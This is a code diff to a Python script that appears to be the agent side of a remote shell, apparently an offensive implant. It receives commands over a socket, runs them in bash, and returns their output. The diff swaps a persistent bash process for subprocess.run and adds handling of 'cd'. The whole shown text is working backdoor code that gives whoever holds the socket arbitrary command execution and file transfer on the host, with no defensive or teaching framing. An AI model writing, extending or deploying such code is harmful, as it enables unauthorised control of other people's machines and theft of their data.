@@ -3,6 +3,8 @@ import argparse
 import select
 import socket
 import time
+import os
+
 # Constants
 READY_STATUS = b"ready_3X1T_5TATUS="
 EXIT_STATUS = b"_3X1T_5TATUS=0"
@@ -40,13 +42,14 @@ def handle_file_transfers(data, s):
 
 class Shell:
     def __init__(self):
-        self.proc = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        self.end_marker = "END_OF_COMMAND"
+        self.end_marker = 'END_OF_COMMAND'
 
     def execute_command(self, command):
-        command_with_marker = f"{command}; echo -n '{self.end_marker}'"
-        self.proc.stdin.write((command_with_marker + "\n").encode())
-        self.proc.stdin.flush()
+        completed_process = subprocess.run(['/bin/bash', '-c', command],
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE)
+
+        return completed_process.stdout, completed_process.stderr
 
     def read_output(self):
         out, err = b"", b""
@@ -65,19 +68,18 @@ class Shell:
 
 def execute_command_and_send_response(data, s, shell):
     """Executes a command and sends the response back through the socket."""
-    shell.execute_command(data.decode("utf-8"))
-    stdout_value, stderr_value = shell.read_output()
+    stdout_value, stderr_value = shell.execute_command(data.decode('utf-8'))
     message_length = len(stdout_value) + len(stderr_value)
     print(message_length)
 
     if message_length > 0:
-        s.sendall(message_length.to_bytes(4, byteorder="big"))
+        s.sendall(message_length.to_bytes(4, byteorder='big'))
         s.sendall(stdout_value)
         s.sendall(stderr_value)
     else:
         stdout_value = b"INFO: no output"
         message_length = len(stdout_value)
-        s.sendall(message_length.to_bytes(4, byteorder="big"))
+        s.sendall(message_length.to_bytes(4, byteorder='big'))
         s.sendall(stdout_value)
 
 def execute_command(s):
@@ -86,6 +88,18 @@ def execute_command(s):
     while True:
         data = s.recv(1024)
         print(data)
+
+        if data.decode().split(" ")[0] == "cd":
+                try:
+                    os.chdir(data.decode().split(" ")[1])
+                    stdout_value = b"INFO: no output"
+                    message_length = len(stdout_value)
+                    s.sendall(message_length.to_bytes(4, byteorder='big'))
+                    s.sendall(stdout_value)
+                except FileNotFoundError:
+                     print('hit')
+                finally:
+                     continue
 
         handle_file_transfers(data, s)
 
